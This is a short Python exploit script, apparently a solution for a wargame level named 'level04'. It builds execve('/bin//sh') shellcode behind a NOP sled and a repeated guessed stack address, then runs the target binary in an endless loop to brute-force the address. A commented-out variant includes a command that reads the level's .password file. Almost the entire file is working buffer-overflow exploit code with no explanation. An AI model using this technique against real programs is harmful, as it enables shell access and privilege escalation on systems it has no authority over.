# import struct, subprocess
# # run = 0x0804875b
# # blob = struct.pack("<i", run)
# # arg2 = "%-31s#%s" % ("cat /home/level04/.password", blob*20)
# 
# shellcode = \
# "\x6a\x0b"            \
# "\x58"                \
# "\x99"                  \
# "\x52"              \
# "\x68\x2f\x2fxy"\
# "\x68\x2ftmp"\
# "\x89\xe3"\
# "\x31\xc9"\
# "\xcd\x80"
# 
# s = file("sc", "wb")
# s.write(shellcode)
# 
# stack = 0xffc1de01
# stack_ptr = struct.pack("<I", stack)*200
# exploit = "\x90" * (1000-len(shellcode)) + shellcode
# arg = "%s%s" % (exploit, stack_ptr)
# subprocess.call(["./level04", arg])

import os
import struct, subprocess
import time
from itertools import count
# run = 0x0804875b
# blob = struct.pack("<i", run)
# arg2 = "%-31s#%s" % ("cat /home/level04/.password", blob*20)

shellcode = \
"\x6a\x0b"            \
"\x58"                \
"\x99"                  \
"\x52"              \
"\x68\x2f\x2f\x73\x68"\
"\x68\x2f\x62\x69\x6e"\
"\x89\xe3"\
"\x31\xc9"\
"\xcd\x80"

stack = 0xffb48e8c
stack_ptr = struct.pack("<I", stack)*500
print(len(shellcode))
exploit = "\x90" * (1024-len(shellcode)) + shellcode
arg = "%s%s" % (exploit, stack_ptr)
# os.execve("/levels/level04", ["/levels/level04", arg], {})
for x in count():
        subprocess.call(["/levels/level04", arg])

